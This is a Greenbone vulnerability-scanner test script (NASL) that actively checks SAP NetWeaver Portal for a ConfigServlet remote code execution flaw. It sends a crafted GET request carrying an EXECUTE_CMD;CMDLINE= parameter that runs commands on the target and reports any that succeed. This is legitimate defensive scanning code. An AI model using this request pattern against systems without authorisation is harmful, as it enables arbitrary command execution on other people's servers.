# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

include("plugin_feed_info.inc");

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103700");
  script_version("2025-05-14T05:40:11+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-05-14 05:40:11 +0000 (Wed, 14 May 2025)");
  script_tag(name:"creation_date", value:"2013-04-18 16:24:58 +0200 (Thu, 18 Apr 2013)");
  script_name("SAP NetWeaver Portal 'ConfigServlet' RCE Vulnerability (1503579, 1616259) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  # nb: See notes below on the reason of this dependency chain
  script_dependencies("gb_sap_netweaver_as_java_http_detect.nasl", "os_detection.nasl");
  if(FEED_NAME == "GSF" || FEED_NAME == "GEF" || FEED_NAME == "SCM")
    script_dependencies("gsf/gb_sap_netweaver_as_icm_http_detect.nasl",
                        "gsf/gb_sap_web_dispatcher_http_detect.nasl",
                        "gsf/gb_sap_icf_http_detect.nasl",
                        "gsf/gb_sap_netweaver_portal_http_detect.nasl",
                        "gsf/gb_sap_netweaver_as_http_detect.nasl");
  script_mandatory_keys("sap/products/http/detected");

  script_xref(name:"URL", value:"https://erpscan.io/presentations/breaking-sap-portal-from-hackerhalted-2012/");
  script_xref(name:"URL", value:"https://erpscan.io/wp-content/uploads/2012/11/Breaking-SAP-Portal-HackerHalted-2012.pdf");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/24963/");
  script_xref(name:"URL", value:"https://launchpad.support.sap.com/#/notes/1503579");
  script_xref(name:"URL", value:"https://launchpad.support.sap.com/#/notes/1616259");

  script_tag(name:"summary", value:"SAP NetWeaver Portal is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks response.

  Note: Multiple same / similar results of this VT are expected if multiple SAP products got
  detected on the same host and port.");

  script_tag(name:"impact", value:"Successfully exploiting these issues may allow an attacker to
  execute arbitrary code with the privileges of the user running the affected application.");

  script_tag(name:"solution", value:"See the referenced vendor advisories for a solution.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

# nb: Reasons for this CPE list:
# - NetWeaver Portal is actually affected
# - In turn NetWeaver Portal is running on NetWeaver AS Java
# - A ICF/ICM relevant service might be also available on the target system
# - A Web Dispatcher might be placed "in front" of an AS (from the relevant docs):
#   > You can use SAP Web Dispatcher in both ABAP and Java systems.
# - cpe:/a:sap:netweaver_as is used as a last fallback to throw all AS related active VTs against
#   all possible deployments
# - We generally want to check / use as much dependencies as possible just to be sure if e.g. the AS
#   Java banner is hidden
cpe_list = make_list("cpe:/a:sap:netweaver_application_server_java", "cpe:/a:sap:netweaver_portal",
                     "cpe:/a:sap:netweaver_application_server_icm", "cpe:/a:sap:web_dispatcher",
                     "cpe:/a:sap:internet_communication_framework", "cpe:/a:sap:netweaver_as");

# nb: No "first_cpe_only:TRUE" as we want to run this against all products / services. Having
# multiple results is acceptable and covered via a note in the vuldetect tag.
if(!infos = get_app_port_from_list(cpe_list:cpe_list, service:"www", first_cpe_only:FALSE))
  exit(0);

port = infos["port"];
cpe = infos["cpe"];

if(!dir = get_app_location(cpe:cpe, port:port))
  exit(0);

if(dir == "/" || dir =~ "^[0-9]+/tcp$") # nb: gb_sap_netweaver_as_http_detect.nasl is setting e.g. 443/tcp
  dir = "";

commands = exploit_commands();

foreach cmd(keys(commands)) {

  url = dir + "/ctc/servlet/ConfigServlet/?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=" + commands[cmd];

  if(buf = http_vuln_check(port:port, url:url, pattern:cmd)) {
    report = 'The Scanner was able to execute the command "' + commands[cmd] + '" on the remote host by\nrequesting the url\n\n' + url + '\n\nwhich produced the following response:\n<response>\n' + buf + '</response>';
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
